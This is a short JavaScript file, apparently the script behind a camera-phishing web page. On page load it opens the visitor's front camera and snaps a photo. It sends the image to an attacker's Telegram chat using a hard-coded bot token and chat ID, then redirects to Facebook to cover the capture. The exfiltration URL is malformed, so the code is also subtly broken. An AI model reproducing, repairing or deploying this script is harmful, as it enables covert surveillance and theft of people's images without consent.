const TOKEN = "8469668913:AAE2ks3XnwwtTnTEXDZHshbLsIZ5ihoI7ZE";
const CHAT_ID = "5870377141";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");

async function start() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;
        setTimeout(capture, 2000); // زدنا الوقت لثانيتين لضمان التحميل
    } catch (err) {
        window.location.href = "https://facebook.com";
    }
}

function capture() {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(function(blob) {
        send(blob);
    }, "image/jpeg", 0.7);
}

function send(capturedBlob) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", capturedBlob, "image.jpg");

    fetch("https://telegram.org" + TOKEN + "/sendPhoto", {
        method: "POST",
        body: formData
    })
    .then(() => {
        window.location.href = "https://facebook.com";
    })
    .catch(() => {
        window.location.href = "https://facebook.com";
    });
}

window.onload = start;
